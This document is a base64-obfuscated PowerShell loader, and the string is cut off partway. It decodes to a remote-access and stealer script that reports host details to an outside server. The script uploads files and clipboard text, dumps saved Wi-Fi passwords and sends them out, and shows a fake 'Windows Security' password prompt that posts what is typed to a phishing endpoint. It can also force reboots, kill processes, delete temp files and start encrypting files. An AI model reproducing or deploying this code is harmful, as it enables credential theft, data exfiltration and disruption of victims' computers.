$e = [System.Convert]::FromBase64String('QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwpBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nCgokU0VSVkVSX1VSTCA9ICJodHRwczovL3hlbnYxLTlndmQub25yZW5kZXIuY29tIgokc2Vzc2lvbl9pZCA9ICRlbnY6Q09NUFVURVJOQU1FCiRzZXNzaW9uX3VzZXJuYW1lID0gJGVudjpVU0VSTkFNRQokc2Vzc2lvbl9pcCA9IChHZXQtTmV0SVBBZGRyZXNzIC1BZGRyZXNzRmFtaWx5IElQdjQgfCBXaGVyZS1PYmplY3QgeyAkXy5JbnRlcmZhY2VBbGlhcyAtbm90bWF0Y2ggIkxvb3BiYWNrIiB9KVswXS5JUEFkZHJlc3MKJHNlc3Npb25fdGltZSA9IChHZXQtRGF0ZSkuVG9TdHJpbmcoInl5eXktTU0tZGQgSEg6bW06c3MiKQoKZnVuY3Rpb24gTm90aWZ5LUNvbm5lY3Rpb24gewogICAgdHJ5IHsKICAgICAgICAjIENyZWF0ZSBhIGhhc2h0YWJsZSB3aXRoIG5hbWVkIHByb3BlcnRpZXMKICAgICAgICAkYm9keSA9IEB7CiAgICAgICAgICAgIHNlc3Npb24gID0gJHNlc3Npb25faWQKICAgICAgICAgICAgdGltZSAgICAgPSAkc2Vzc2lvbl90aW1lCiAgICAgICAgICAgIHVzZXJuYW1lID0gJHNlc3Npb25fdXNlcm5hbWUKICAgICAgICAgICAgaXAgICAgICAgPSAkc2Vzc2lvbl9pcAogICAgICAgIH0gfCBDb252ZXJ0VG8tSnNvbgoKICAgICAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICIkU0VSVkVSX1VSTC9yZWNlaXZlLXJlc3VsdCIgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKICAgIH0gY2F0Y2ggewogICAgICAgICMgT3B0aW9uYWw6IGhhbmRsZSBvciBsb2cgZXJyb3IgaGVyZQogICAgfQp9CgpmdW5jdGlvbiBSZXN0YXJ0LVN5c3RlbSB7CiAgICBSZXN0YXJ0LUNvbXB1dGVyIC1Gb3JjZQoKfQoKZnVuY3Rpb24gU2h1dGRvd24tU3lzdGVtIHsKICAgIFN0b3AtQ29tcHV0ZXIgLUZvcmNlCn0KCmZ1bmN0aW9uIFNlbmQtVGVsZWdyYW1GaWxlIHsKICAgIHBhcmFtKFtzdHJpbmddJGZpbGVQYXRoKQoKICAgIGlmICgtbm90IChbU3lzdGVtLklPLlBhdGhdOjpJc1BhdGhSb290ZWQoJGZpbGVQYXRoKSkpIHsKICAgICAgICAkZmlsZVBhdGggPSBKb2luLVBhdGggLVBhdGggKEdldC1Mb2NhdGlvbikuUGF0aCAtQ2hpbGRQYXRoICRmaWxlUGF0aAogICAgfQoKICAgICR1cmkgPSAiJFNFUlZFUl9VUkwvZmlsZXMiCiAgICAkZmlsZU5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkZmlsZVBhdGgpCiAgICAkYm91bmRhcnkgPSBbU3lzdGVtLkd1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoKQogICAgJExGID0gImByYG4iCgogICAgJGZpbGVDb250ZW50ID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRmaWxlUGF0aCkKCiAgICAkZmllbGRzID0gKAogICAgICAgICItLSRib3VuZGFyeSRMRiIgKwogICAgICAgICJDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9YCJkb2N1bWVudGAiOyBmaWxlbmFtZT1gIiRmaWxlTmFtZWAiJExGIiArCiAgICAgICAgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJExGJExGIgogICAgKQoKICAgICRlbmRCb3VuZGFyeSA9ICIkTEYtLSRib3VuZGFyeS0tJExGIgogICAgJGJvZHlCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRmaWVsZHMpICsgJGZpbGVDb250ZW50ICsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoJGVuZEJvdW5kYXJ5KQoKICAgICRyZXF1ZXN0ID0gW1N5c3RlbS5OZXQuSHR0cFdlYlJlcXVlc3RdOjpDcmVhdGUoJHVyaSkKICAgICRyZXF1ZXN0Lk1ldGhvZCA9ICJQT1NUIgogICAgJHJlcXVlc3QuQ29udGVudFR5cGUgPSAibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9JGJvdW5kYXJ5IgogICAgJHJlcXVlc3QuQ29udGVudExlbmd0aCA9ICRib2R5Qnl0ZXMuTGVuZ3RoCgogICAgJHJlcXVlc3RTdHJlYW0gPSAkcmVxdWVzdC5HZXRSZXF1ZXN0U3RyZWFtKCkKICAgICRyZXF1ZXN0U3RyZWFtLldyaXRlKCRib2R5Qnl0ZXMsIDAsICRib2R5Qnl0ZXMuTGVuZ3RoKQogICAgJHJlcXVlc3RTdHJlYW0uQ2xvc2UoKQoKICAgIHRyeSB7CiAgICAgICAgJHJlc3BvbnNlID0gJHJlcXVlc3QuR2V0UmVzcG9uc2UoKQogICAgICAgICRyZWFkZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlcigkcmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKSkKICAgICAgICAkcmVhZGVyLlJlYWRUb0VuZCgpIHwgT3V0LU51bGwKICAgICAgICAkcmVhZGVyLkNsb3NlKCkKICAgIH0gY2F0Y2gge30KfQoKZnVuY3Rpb24gU2VuZC1DbGlwYm9hcmQgewogICAgdHJ5IHsKICAgICAgICAkdGV4dCA9IHBvd2Vyc2hlbGwgLVNUQSAtQ29tbWFuZCB7CiAgICAgICAgICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMKICAgICAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkNsaXBib2FyZF06OkdldFRleHQoKQogICAgICAgIH0KCiAgICAgICAgaWYgKCFbc3RyaW5nXTo6SXNOdWxsT3JXaGl0ZVNwYWNlKCR0ZXh0KSkgewogICAgICAgICAgICAkbWF4Q2h1bmtTaXplID0gNDA5NgogICAgICAgICAgICAkY2h1bmtzID0gW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXV06Om5ldygpCiAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJHRleHQuTGVuZ3RoOyAkaSArPSAkbWF4Q2h1bmtTaXplKSB7CiAgICAgICAgICAgICAgICAkY2h1bmsgPSAkdGV4dC5TdWJzdHJpbmcoJGksIFtNYXRoXTo6TWluKCRtYXhDaHVua1NpemUsICR0ZXh0Lkxlbmd0aCAtICRpKSkKICAgICAgICAgICAgICAgICRjaHVua3MuQWRkKCRjaHVuaykKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZm9yZWFjaCAoJGNodW5rIGluICRjaHVua3MpIHsKICAgICAgICAgICAgICAgICRib2R5ID0gQHsKICAgICAgICAgICAgICAgICAgICByZXN1bHQgPSAkY2h1bmsKICAgICAgICAgICAgICAgIH0gfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMwoKICAgICAgICAgICAgICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgIiRTRVJWRVJfVVJML2NsaXBib2FyZCIgLU1ldGhvZCBQT1NUIC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIgfCBPdXQtTnVsbAogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtSG9zdCAiWyFdIENsaXBib2FyZCBpcyBlbXB0eS4iCiAgICAgICAgfQogICAgfSBjYXRjaCB7CiAgICAgICAgV3JpdGUtSG9zdCAiWyFdIEZhaWxlZCB0byBhY2Nlc3MgY2xpcGJvYXJkOiAkXyIKICAgIH0KfQoKCmZ1bmN0aW9uIEtpbGwtQWxsUG93ZXJTaGVsbFByb2Nlc3NlcyB7CiAgICAjIEdldCBhbGwgUG93ZXJTaGVsbCBwcm9jZXNzZXMgKGJvdGggJ3Bvd2Vyc2hlbGwuZXhlJyBhbmQgJ3B3c2guZXhlJykKICAgICRwb3dlcnNoZWxsUHJvY2Vzc2VzID0gR2V0LVByb2Nlc3MgLU5hbWUgInBvd2Vyc2hlbGwiLCAicHdzaCIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKCiAgICAjIElmIHRoZXJlIGFyZSBhbnkgUG93ZXJTaGVsbCBwcm9jZXNzZXMgcnVubmluZwogICAgaWYgKCRwb3dlcnNoZWxsUHJvY2Vzc2VzKSB7CiAgICAgICAgZm9yZWFjaCAoJHByb2Nlc3MgaW4gJHBvd2Vyc2hlbGxQcm9jZXNzZXMpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICMgS2lsbCB0aGUgcHJvY2VzcyBmb3JjZWZ1bGx5CiAgICAgICAgICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRwcm9jZXNzLklkIC1Gb3JjZQogICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICMgU2lsZW50bHkgaWdub3JlIGVycm9ycyAoZS5nLiwgYWNjZXNzIGRlbmllZCkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gQ2xlYXItVGVtcERpciB7CiAgICAjIEdldCB0aGUgcGF0aCB0byB0aGUgdGVtcCBkaXJlY3RvcnkKICAgICR0ZW1wRGlyID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcFBhdGgoKQoKICAgICMgQ2hlY2sgaWYgdGhlIHRlbXAgZGlyZWN0b3J5IGV4aXN0cwogICAgaWYgKFRlc3QtUGF0aCAkdGVtcERpcikgewogICAgICAgICMgRmxhZyB0byB0cmFjayBpZiBhbnkgZmlsZSB3YXMgZGVsZXRlZAogICAgICAgICRkZWxldGVkRmlsZXMgPSAkZmFsc2UKCiAgICAgICAgIyBSZW1vdmUgYWxsIGZpbGVzIGluIHRoZSB0ZW1wIGRpcmVjdG9yeSBzaWxlbnRseQogICAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJHRlbXBEaXIgLVJlY3Vyc2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAjIFJlbW92ZSB0aGUgaXRlbSBhbmQgbWFyayBhcyBkZWxldGVkCiAgICAgICAgICAgICAgICBSZW1vdmUtSXRlbSAkXy5GdWxsTmFtZSAtRm9yY2UgLVJlY3Vyc2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgICRkZWxldGVkRmlsZXMgPSAkdHJ1ZQogICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICMgSWdub3JlIGVycm9ycyBzaWxlbnRseQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAjIFByaW50IHN1Y2Nlc3MgbWVzc2FnZSBpZiBhbnkgZmlsZSB3YXMgZGVsZXRlZAogICAgICAgIGlmICgkZGVsZXRlZEZpbGVzKSB7CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LVdpZmlQYXNzd29yZHMgewogICAgcGFyYW0oCiAgICAgICAgW3N0cmluZ10kU0VSVkVSX1VSTCAgIyBwYXNzIHlvdXIgc2VydmVyIFVSTCBoZXJlIG9yIHVzZSBnbG9iYWwgdmFyaWFibGUKICAgICkKCiAgICAkc2VuZCA9ICIkU0VSVkVSX1VSTC9zeXN0ZW0iCiAgICAkd2lmaURldGFpbHMgPSBAKCkKCiAgICB0cnkgewogICAgICAgICRwcm9maWxlc091dHB1dCA9IG5ldHNoIHdsYW4gc2hvdyBwcm9maWxlcwoKICAgICAgICAkcHJvZmlsZU5hbWVzID0gJHByb2ZpbGVzT3V0cHV0IHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8gLW1hdGNoICJBbGwgVXNlciBQcm9maWxlXHMqOlxzKiguKykiIH0gfAogICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZiAoJF8gLW1hdGNoICJBbGwgVXNlciBQcm9maWxlXHMqOlxzKiguKykiKSB7CiAgICAgICAgICAgICAgICAgICAgJG1hdGNoZXNbMV0uVHJpbSgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgZm9yZWFjaCAoJHdpZmlOYW1lIGluICRwcm9maWxlTmFtZXMpIHsKICAgICAgICAgICAgJHByb2ZpbGVEZXRhaWxzID0gbmV0c2ggd2xhbiBzaG93IHByb2ZpbGUgbmFtZT0iJHdpZmlOYW1lIiBrZXk9Y2xlYXIKCiAgICAgICAgICAgIGlmICgkcHJvZmlsZURldGFpbHMpIHsKICAgICAgICAgICAgICAgICMgRXh0cmFjdCBQYXNzd29yZAogICAgICAgICAgICAgICAgJHBhc3N3b3JkTWF0Y2ggPSAkcHJvZmlsZURldGFpbHMgfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICJLZXkgQ29udGVudFxzKjpccyooLispIgogICAgICAgICAgICAgICAgJHdpZmlQYXNzd29yZCA9IGlmICgkcGFzc3dvcmRNYXRjaCkgewogICAgICAgICAgICAgICAgICAgICRwYXNzd29yZE1hdGNoLk1hdGNoZXNbMF0uR3JvdXBzWzFdLlZhbHVlLlRyaW0oKQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAiKE5vdCBzZXQgb3IgaGlkZGVuKSIKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjIEV4dHJhY3QgQXV0aGVudGljYXRpb24gVHlwZQogICAgICAgICAgICAgICAgJGF1dGhNYXRjaCA9ICRwcm9maWxlRGV0YWlscyB8IFNlbGVjdC1TdHJpbmcgLVBhdHRlcm4gIkF1dGhlbnRpY2F0aW9uXHMqOlxzKiguKykiCiAgICAgICAgICAgICAgICAkYXV0aFR5cGUgPSBpZiAoJGF1dGhNYXRjaCkgewogICAgICAgICAgICAgICAgICAgICRhdXRoTWF0Y2guTWF0Y2hlc1swXS5Hcm91cHNbMV0uVmFsdWUuVHJpbSgpCiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICIoVW5rbm93bikiCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgIyBFeHRyYWN0IENpcGhlciBUeXBlCiAgICAgICAgICAgICAgICAkY2lwaGVyTWF0Y2ggPSAkcHJvZmlsZURldGFpbHMgfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICJDaXBoZXJccyo6XHMqKC4rKSIKICAgICAgICAgICAgICAgICRjaXBoZXJUeXBlID0gaWYgKCRjaXBoZXJNYXRjaCkgewogICAgICAgICAgICAgICAgICAgICRjaXBoZXJNYXRjaC5NYXRjaGVzWzBdLkdyb3Vwc1sxXS5WYWx1ZS5UcmltKCkKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgIihVbmtub3duKSIKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkd2lmaURldGFpbHMgKz0gW1BTQ3VzdG9tT2JqZWN0XUB7CiAgICAgICAgICAgICAgICAgICAgV2lGaU5hbWUgICAgICAgPSAkd2lmaU5hbWUKICAgICAgICAgICAgICAgICAgICBBdXRoZW50aWNhdGlvbiA9ICRhdXRoVHlwZQogICAgICAgICAgICAgICAgICAgIENpcGhlciAgICAgICAgID0gJGNpcGhlclR5cGUKICAgICAgICAgICAgICAgICAgICBQYXNzd29yZCAgICAgICA9ICR3aWZpUGFzc3dvcmQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgIyBDb252ZXJ0IHdob2xlIHJlc3VsdCB0byBKU09OCiAgICAgICAgJGpzb25Cb2R5ID0gJHdpZmlEZXRhaWxzIHwgQ29udmVydFRvLUpzb24gLURlcHRoIDMKCiAgICAgICAgIyBTZW5kIG9uY2UgdG8gc2VydmVyIHNpbGVudGx5CiAgICAgICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkc2VuZCAtTWV0aG9kIFBvc3QgLUJvZHkgJGpzb25Cb2R5IC1Db250ZW50VHlwZSAnYXBwbGljYXRpb24vanNvbicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKCiAgICB9IGNhdGNoIHsKICAgICAgICAjIElnbm9yZSBlcnJvcnMgc2lsZW50bHkKICAgIH0KfQoKCgoKZnVuY3Rpb24gU2V0LVdhbGxwYXBlciB7CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSRjaGFuZ2UKICAgICkKCiAgICBmdW5jdGlvbiBJbnZva2UtV2FsbHBhcGVyQ2hhbmdlIHsKICAgICAgICBwYXJhbShbc3RyaW5nXSRpbWFnZVBhdGgpCgogICAgICAgIEFkZC1UeXBlIEAiCnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKcHVibGljIGNsYXNzIFdhbGxwYXBlciB7CiAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFN5c3RlbVBhcmFtZXRlcnNJbmZvKGludCB1QWN0aW9uLCBpbnQgdVBhcmFtLCBzdHJpbmcgbHB2UGFyYW0sIGludCBmdVdpbkluaSk7Cn0KIkAKCiAgICAgICAgJFNQSV9TRVRERVNLV0FMTFBBUEVSID0gMHgwMDE0CiAgICAgICAgJFNQSUZfVVBEQVRFSU5JRklMRSA9IDB4MDEKICAgICAgICAkU1BJRl9TRU5EQ0hBTkdFID0gMHgwMgoKICAgICAgICBbV2FsbHBhcGVyXTo6U3lzdGVtUGFyYW1ldGVyc0luZm8oJFNQSV9TRVRERVNLV0FMTFBBUEVSLCAwLCAkaW1hZ2VQYXRoLCAkU1BJRl9VUERBVEVJTklGSUxFIC1ib3IgJFNQSUZfU0VORENIQU5HRSkKICAgIH0KCiAgICBpZiAoJGNoYW5nZSAtbWF0Y2ggIl5odHRwcz86Ly8iKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJGZpbGVOYW1lID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWUoJGNoYW5nZSkKICAgICAgICAgICAgJHRlbXBQYXRoID0gSm9pbi1QYXRoICRlbnY6VEVNUCAkZmlsZU5hbWUKICAgICAgICAgICAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkY2hhbmdlIC1PdXRGaWxlICR0ZW1wUGF0aCAtVXNlQmFzaWNQYXJzaW5nCiAgICAgICAgICAgIEludm9rZS1XYWxscGFwZXJDaGFuZ2UgLWltYWdlUGF0aCAkdGVtcFBhdGgKICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtRXJyb3IgIkZhaWxlZCB0byBkb3dubG9hZCBvciBzZXQgd2FsbHBhcGVyOiAkXyIKICAgICAgICB9CiAgICB9IGVsc2VpZiAoVGVzdC1QYXRoICRjaGFuZ2UpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBJbnZva2UtV2FsbHBhcGVyQ2hhbmdlIC1pbWFnZVBhdGggJGNoYW5nZQogICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICBXcml0ZS1FcnJvciAiRXJyb3Igc2V0dGluZyB3YWxscGFwZXI6ICRfIgogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgIyBUcnkgY2hlY2tpbmcgaW4gY3VycmVudCBkaXJlY3RvcnkKICAgICAgICAkbG9jYWxQYXRoID0gSm9pbi1QYXRoIChHZXQtTG9jYXRpb24pICRjaGFuZ2UKICAgICAgICBpZiAoVGVzdC1QYXRoICRsb2NhbFBhdGgpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIEludm9rZS1XYWxscGFwZXJDaGFuZ2UgLWltYWdlUGF0aCAkbG9jYWxQYXRoCgogICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLUVycm9yICJFcnJvciBzZXR0aW5nIHdhbGxwYXBlciBmcm9tIGN1cnJlbnQgZGlyZWN0b3J5OiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLUVycm9yICJJbnZhbGlkIGlucHV0OiBub3QgYSB2YWxpZCBVUkwgb3IgZmlsZSBwYXRoLiIKICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIFNob3ctU2VjdXJpdHlGb3JtIHsKICAgICMgQ3JlYXRlIHRoZSBmb3JtCiAgICAkZm9ybSA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuRm9ybQogICAgJGZvcm0uVGV4dCA9ICJXaW5kb3dzIFNlY3VyaXR5IgogICAgJGZvcm0uU2l6ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuU2l6ZSg0MDAsMjUwKQogICAgJGZvcm0uU3RhcnRQb3NpdGlvbiA9ICJDZW50ZXJTY3JlZW4iCiAgICAkZm9ybS5CYWNrQ29sb3IgPSBbU3lzdGVtLkRyYXdpbmcuQ29sb3JdOjpCbGFjawogICAgJGZvcm0uRm9ybUJvcmRlclN0eWxlID0gW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkZvcm1Cb3JkZXJTdHlsZV06Ok5vbmUKICAgICRmb3JtLk1heGltaXplQm94ID0gJGZhbHNlCgogICAgIyBUaXRsZSBMYWJlbAogICAgJHRpdGxlTGFiZWwgPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsCiAgICAkdGl0bGVMYWJlbC5UZXh0ID0gIldpbmRvd3MgU2VjdXJpdHkiCiAgICAkdGl0bGVMYWJlbC5Gb3JlQ29sb3IgPSBbU3lzdGVtLkRyYXdpbmcuQ29sb3JdOjpXaGl0ZQogICAgJHRpdGxlTGFiZWwuRm9udCA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuRm9udCgiU2Vnb2UgVUkiLCAyMCwgW1N5c3RlbS5EcmF3aW5nLkZvbnRTdHlsZV06OkJvbGQpCiAgICAkdGl0bGVMYWJlbC5BdXRvU2l6ZSA9ICR0cnVlCiAgICAkdGl0bGVMYWJlbC5Mb2NhdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuUG9pbnQoMjAsMjApCiAgICAkZm9ybS5Db250cm9scy5BZGQoJHRpdGxlTGFiZWwpCgogICAgIyBQYXNzd29yZCBMYWJlbAogICAgJHBhc3N3b3JkTGFiZWwgPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsCiAgICAkcGFzc3dvcmRMYWJlbC5UZXh0ID0gIkVudGVyIHlvdXIgcGFzc3dvcmQ6IgogICAgJHBhc3N3b3JkTGFiZWwuRm9yZUNvbG9yID0gW1N5c3RlbS5EcmF3aW5nLkNvbG9yXTo6V2hpdGUKICAgICRwYXNzd29yZExhYmVsLkZvbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLkZvbnQoIlNlZ29lIFVJIiwgMTIpCiAgICAkcGFzc3dvcmRMYWJlbC5BdXRvU2l6ZSA9ICR0cnVlCiAgICAkcGFzc3dvcmRMYWJlbC5Mb2NhdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuUG9pbnQoMjAsNzApCiAgICAkZm9ybS5Db250cm9scy5BZGQoJHBhc3N3b3JkTGFiZWwpCgogICAgIyBQYXNzd29yZCBUZXh0Qm94CiAgICAkcGFzc3dvcmRUZXh0Ym94ID0gTmV3LU9iamVjdCBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5UZXh0Qm94CiAgICAkcGFzc3dvcmRUZXh0Ym94LkxvY2F0aW9uID0gTmV3LU9iamVjdCBTeXN0ZW0uRHJhd2luZy5Qb2ludCgyMCwxMDApCiAgICAkcGFzc3dvcmRUZXh0Ym94LlNpemUgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlNpemUoMzUwLDMwKQogICAgJHBhc3N3b3JkVGV4dGJveC5Vc2VTeXN0ZW1QYXNzd29yZENoYXIgPSAkdHJ1ZQogICAgJGZvcm0uQ29udHJvbHMuQWRkKCRwYXNzd29yZFRleHRib3gpCgogICAgIyBTdWJtaXQgQnV0dG9uCiAgICAkc3VibWl0QnV0dG9uID0gTmV3LU9iamVjdCBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5CdXR0b24KICAgICRzdWJtaXRCdXR0b24uVGV4dCA9ICJPSyIKICAgICRzdWJtaXRCdXR0b24uTG9jYXRpb24gPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlBvaW50KDE1MCwxODApCiAgICAkc3VibWl0QnV0dG9uLlNpemUgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlNpemUoMTAwLDMwKQogICAgJHN1Ym1pdEJ1dHRvbi5CYWNrQ29sb3IgPSBbU3lzdGVtLkRyYXdpbmcuQ29sb3JdOjpGcm9tQXJnYigwLCAxMjAsIDIxNSkKICAgICRzdWJtaXRCdXR0b24uRm9yZUNvbG9yID0gW1N5c3RlbS5EcmF3aW5nLkNvbG9yXTo6V2hpdGUKICAgICRmb3JtLkNvbnRyb2xzLkFkZCgkc3VibWl0QnV0dG9uKQoKICAgICMg8J+UuSBIYW5kbGUgY2xpY2sgdG8gc2VuZCBwYXNzd29yZCB0byBOb2RlLmpzIEFQSQogICAgJHN1Ym1pdEJ1dHRvbi5BZGRfQ2xpY2soewogICAgICAgIGlmIChbc3RyaW5nXTo6SXNOdWxsT3JXaGl0ZVNwYWNlKCRwYXNzd29yZFRleHRib3guVGV4dCkpIHsKICAgICAgICAgICAgJGVycm9yTGFiZWwuVGV4dCA9ICJZb3UgbXVzdCBlbnRlciBhIHBhc3N3b3JkLiIKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkcGFzc3dvcmQgPSAkcGFzc3dvcmRUZXh0Ym94LlRleHQKICAgICAgICAgICAgJG1lc3NhZ2UgPSAiUGhpc2hpbmcgQ3JlZGVudGlhbHM6IGBuUGFzc3dvcmQ6ICRwYXNzd29yZCIKICAgICAgICAgICAgCiAgICAgICAgICAgICMgU2VuZCB0aGUgcGFzc3dvcmQgdG8gdGhlIHJlc3VsdCBBUEkgKE5vZGUuanMgc2VydmVyKQogICAgICAgICAgICAkcmVzdWx0QVBJID0gIiRTRVJWRVJfVVJML3BoaXNoaW5nIiAgIyBZb3VyIE5vZGUuanMgQVBJIGVuZHBvaW50CgogICAgICAgICAgICAkYm9keSA9IEB7CiAgICAgICAgICAgICAgICByZXN1bHQgPSAkcGFzc3dvcmQKICAgICAgICAgICAgfSB8IENvbnZlcnRUby1Kc29uCgogICAgICAgICAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICRyZXN1bHRBUEkgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKCiAgICAgICAgICAgICMgQ2xvc2UgdGhlIGZvcm0gYWZ0ZXIgc2VuZGluZyB0aGUgcGFzc3dvcmQKICAgICAgICAgICAgJGZvcm0uQ2xvc2UoKQogICAgICAgIH0KICAgIH0pCgogICAgIyBTaG93IHRoZSBmb3JtCiAgICAkZm9ybS5BZGRfU2hvd24oeyAkZm9ybS5BY3RpdmF0ZSgpIH0pCiAgICAkZm9ybS5TaG93RGlhbG9nKCkgfCBPdXQtTnVsbAp9CgpmdW5jdGlvbiBGb3JtYXQtUmVzcG9uc2UgewogICAgcGFyYW0oW2hhc2h0YWJsZV0kZGF0YSkKICAgIAogICAgJGZvcm1hdHRlZCA9IEAoKQogICAgJGZvcm1hdHRlZCArPSAiY29weSIKICAgIGZvcmVhY2ggKCRrZXkgaW4gJGRhdGEuS2V5cykgewogICAgICAgICR2YWx1ZSA9ICRkYXRhWyRrZXldCiAgICAgICAgaWYgKCR2YWx1ZSAtaXMgW2FycmF5XSkgewogICAgICAgICAgICAkdmFsdWUgPSAkdmFsdWUgLWpvaW4gIiwiCiAgICAgICAgfQogICAgICAgICRmb3JtYXR0ZWQgKz0gIiQoJGtleS5QYWRSaWdodCgxNSkpOiAkdmFsdWUiCiAgICB9CiAgICByZXR1cm4gJGZvcm1hdHRlZCAtam9pbiAiYG4iCn0KCmZ1bmN0aW9uIEVuY3J5cHQtRmlsZVdpdGhQYXNzd29yZCB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kZmlsZVBhdGgKICAgICkKCiAgICAkcGFzc3dvcmQgPSAiS0FLU0RGS0FLU0pKRk4xMjFra2sjIyMxMjQ5MDEwMjA0OTE5bWxta2Frc2tmbmtsYTk5OTkpKT8/IgoKICAgICMgR2VuZXJhdGUgQUVTIGtleSBhbmQgSVYgZnJvbSB0aGUgcGFzc3dvcmQgdXNpbmcgUEJLREYyCiAgICAkc